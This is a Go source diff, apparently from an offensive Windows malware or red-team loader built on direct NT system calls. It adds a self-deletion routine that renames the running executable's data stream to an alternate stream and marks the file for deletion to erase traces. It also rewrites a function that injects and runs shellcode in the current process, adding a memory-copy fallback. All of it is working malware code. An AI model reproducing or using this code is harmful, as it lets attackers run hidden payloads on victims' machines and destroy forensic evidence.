@@ -73,7 +73,138 @@ func GetSyscallCacheStats() map[string]interface{} {
 	}
 }
 
+func SelfDel() {
+	exePath, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+	
+	// Use NT path format which is required for NtCreateFile with DELETE access
+	ntPath := "\\??\\" + exePath
+	debug.Printfln("SELFDEL", "Using NT path format: %s\n", ntPath)
+	
+	if tryDeleteWithPath(ntPath) {
+		debug.Printfln("SELFDEL", "Successfully initiated self-deletion\n")
+		return
+	}
+	
+	debug.Printfln("SELFDEL", "[!] Self-deletion failed\n")
+}
 
+func tryDeleteWithPath(pathToTry string) bool {
+	// Convert to UTF-16 for NtCreateFile
+	utfPath := StringToUTF16(pathToTry)
+
+	// Create UNICODE_STRING manually and correctly
+	// Count the actual UTF-16 length (excluding null terminator)
+	pathLen := uint16(0)
+	ptr := utfPath
+	for *ptr != 0 {
+		pathLen += 2 // Each UTF-16 character is 2 bytes
+		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
+	}
+
+	objectName := UNICODE_STRING{
+		Length:        pathLen,           // Length in bytes (excluding null terminator)
+		MaximumLength: pathLen + 2,       // Include null terminator
+		Buffer:        utfPath,
+	}
+
+	debug.Printfln("SELFDEL", "UNICODE_STRING: Length=%d, MaxLength=%d\n", objectName.Length, objectName.MaximumLength)
+
+	// Initialize OBJECT_ATTRIBUTES
+	objAttr := OBJECT_ATTRIBUTES{
+		Length:                   uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
+		RootDirectory:            0,
+		ObjectName:               &objectName,
+		Attributes:               OBJ_CASE_INSENSITIVE,
+		SecurityDescriptor:       0,
+		SecurityQualityOfService: 0,
+	}
+
+	debug.Printfln("SELFDEL", "OBJECT_ATTRIBUTES initialized, Length=%d\n", objAttr.Length)
+
+	// Open the file handle via NtCreateFile
+	var handle uintptr
+	var ioStatus IO_STATUS_BLOCK
+
+	status, err := NtCreateFile(
+		&handle,
+		DELETE|SYNCHRONIZE,
+		uintptr(unsafe.Pointer(&objAttr)),
+		uintptr(unsafe.Pointer(&ioStatus)),
+		nil, // AllocationSize
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
+		FILE_OPEN,
+		FILE_NON_DIRECTORY_FILE|FILE_SYNCHRONOUS_IO_NONALERT,
+		nil, // EaBuffer
+		0,   // EaLength
+	)
+	if err != nil || status != STATUS_SUCCESS {
+		debug.Printfln("SELFDEL", "NtCreateFile failed: %v (%s)\n", err, FormatNTStatus(status))
+		return false
+	}
+	defer NtClose(handle)
+	debug.Printfln("SELFDEL", "File handle acquired with DELETE access\n")
+
+	// Prepare FILE_RENAME_INFORMATION with alternate data stream name
+	streamName := ":trash"
+	streamUTF16 := StringToUTF16(streamName)
+	
+	// Calculate the actual UTF-16 byte length (excluding null terminator)
+	streamNameBytes := 0
+	ptr = streamUTF16
+	for *ptr != 0 {
+		streamNameBytes += 2
+		ptr = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(ptr)) + 2))
+	}
+	
+	// Create the rename information structure
+	renameSize := uintptr(unsafe.Sizeof(FILE_RENAME_INFO{})) + uintptr(streamNameBytes)
+	buf := make([]byte, renameSize)
+	renameInfo := (*FILE_RENAME_INFO)(unsafe.Pointer(&buf[0]))
+	renameInfo.ReplaceIfExists = 1  // Allow replacement
+	renameInfo.RootDirectory = 0    // No root directory
+	renameInfo.FileNameLength = uint32(streamNameBytes)
+	
+	// Copy the UTF-16 string to the FileName field (without null terminator)
+	dstPtr := uintptr(unsafe.Pointer(&renameInfo.FileName[0]))
+	srcPtr := uintptr(unsafe.Pointer(streamUTF16))
+	for i := 0; i < streamNameBytes/2; i++ {
+		*(*uint16)(unsafe.Pointer(dstPtr + uintptr(i*2))) = *(*uint16)(unsafe.Pointer(srcPtr + uintptr(i*2)))
+	}
+
+	// Call NtSetInformationFile to rename to ADS
+	status, err = NtSetInformationFile(
+		handle,
+		uintptr(unsafe.Pointer(&ioStatus)),
+		unsafe.Pointer(renameInfo),
+		uintptr(renameSize),
+		FileRenameInformation,
+	)
+	if err != nil || status != STATUS_SUCCESS {
+		debug.Printfln("SELFDEL", "Rename failed: %v (%s)\n", err, FormatNTStatus(status))
+		return false
+	}
+	debug.Printfln("SELFDEL", "File renamed to ADS\n")
+
+	// Set FILE_DISPOSITION_INFO to mark for deletion
+	dispose := FILE_DISPOSITION_INFO{DeleteFile: 1}
+	status, err = NtSetInformationFile(
+		handle,
+		uintptr(unsafe.Pointer(&ioStatus)),
+		unsafe.Pointer(&dispose),
+		uintptr(unsafe.Sizeof(dispose)),
+		FileDispositionInformation,
+	)
+	if err != nil || status != STATUS_SUCCESS {
+		debug.Printfln("SELFDEL", "Disposition failed: %v (%s)\n", err, FormatNTStatus(status))
+		return false
+	}
+	debug.Printfln("SELFDEL", "File marked for deletion\n")
+	return true
+}
 // StringToUTF16 converts a Go string to a UTF16 string pointer
 // This replaces syscall.UTF16PtrFromString to avoid standard library dependencies
 func StringToUTF16(s string) *uint16 {
@@ -109,10 +240,6 @@ func StringToUTF16(s string) *uint16 {
 	// Return pointer to first element
 	return &utf16Slice[0]
 }
-
-
-
-
 
 // Common Windows API functions with proper type safety
 
@@ -1108,8 +1235,19 @@ func NtInjectSelfShellcode(shellcode []byte) error {
 	debug.Printfln("WINAPI", "Debug: Shellcode length: %d, first byte: 0x%02X, ptr: %p\n", 
 		len(shellcode), shellcode[0], &shellcode[0])
 	
-	// Allocate "safe" memory for shellcode source using Windows API
-	// This ensures the source memory is in a region Windows likes
+	// First attempt: Try direct injection with original Go memory
+	debug.Printfln("WINAPI", "Attempting direct injection with Go memory\n")
+	result := OriginalNtInjectSelfShellcode(shellcode)
+	
+	// If direct injection succeeded, we're done
+	if result == nil {
+		debug.Printfln("WINAPI", "Direct injection succeeded!\n")
+		return nil
+	}
+	
+	// Fallback: Use "safe memory" workaround for compatibility
+	debug.Printfln("WINAPI", "Direct injection failed (%v), trying safe memory fallback\n", result)
+	
 	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
 	var sourceAddress uintptr
 	size := uintptr(len(shellcode))
@@ -1123,47 +1261,44 @@ func NtInjectSelfShellcode(shellcode []byte) error {
 		0x04,          // PAGE_READWRITE
 	)
 	
-	var result error
-	
 	if err != nil || status != 0 {
-		debug.Printfln("WINAPI", "Warning: Could not allocate safe source memory, using original: %v\n", err)
-		// Fallback to original
-		result = NtInjectSelfShellcode(shellcode)
-	} else {
-		// Copy shellcode to safe memory region
-		var bytesWritten uintptr
-		writeStatus, writeErr := NtWriteVirtualMemory(
-			currentProcess,
-			sourceAddress,
-			unsafe.Pointer(&shellcode[0]),
-			uintptr(len(shellcode)),
-			&bytesWritten,
-		)
-		
-		if writeErr != nil || writeStatus != 0 || bytesWritten != uintptr(len(shellcode)) {
-			debug.Printfln("WINAPI", "Warning: Could not copy to safe memory, using original: %v\n", writeErr)
-			// Cleanup and fallback
-			NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
-			result = NtInjectSelfShellcode(shellcode)
-		} else {
-			// Create byte slice pointing to safe memory
-			safeShellcode := (*[1 << 30]byte)(unsafe.Pointer(sourceAddress))[:len(shellcode):len(shellcode)]
-			debug.Printfln("WINAPI", "Debug: Using safe memory at: %p\n", unsafe.Pointer(sourceAddress))
-			
-			result = OriginalNtInjectSelfShellcode(safeShellcode)
-			
-			// Cleanup safe memory
-			NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
-		}
+		debug.Printfln("WINAPI", "Failed to allocate safe source memory: %v\n", err)
+		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
 	}
+	
+	// Copy shellcode to safe memory region
+	var bytesWritten uintptr
+	writeStatus, writeErr := NtWriteVirtualMemory(
+		currentProcess,
+		sourceAddress,
+		unsafe.Pointer(&shellcode[0]),
+		uintptr(len(shellcode)),
+		&bytesWritten,
+	)
+	
+	if writeErr != nil || writeStatus != 0 || bytesWritten != uintptr(len(shellcode)) {
+		debug.Printfln("WINAPI", "Failed to copy to safe memory: %v\n", writeErr)
+		// Cleanup and return original error
+		NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
+		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
+	}
+	
+	// Create byte slice pointing to safe memory and try injection again
+	safeShellcode := (*[1 << 30]byte)(unsafe.Pointer(sourceAddress))[:len(shellcode):len(shellcode)]
+	debug.Printfln("WINAPI", "Using safe memory fallback at: %p\n", unsafe.Pointer(sourceAddress))
+	
+	result = OriginalNtInjectSelfShellcode(safeShellcode)
+	
+	// Cleanup safe memory
+	NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
 	
 	if result != nil {
-		debug.Printfln("WINAPI", "Self-injection failed: %v\n", result)
-	} else {
-		debug.Printfln("WINAPI", "Self-injection completed successfully!")
+		debug.Printfln("WINAPI", "Safe memory fallback also failed: %v\n", result)
+		return fmt.Errorf("all injection methods failed: %v", result)
 	}
 	
-	return result
+	debug.Printfln("WINAPI", "Safe memory fallback succeeded!\n")
+	return nil
 }
 
 func OriginalNtInjectSelfShellcode(payload []byte) error {
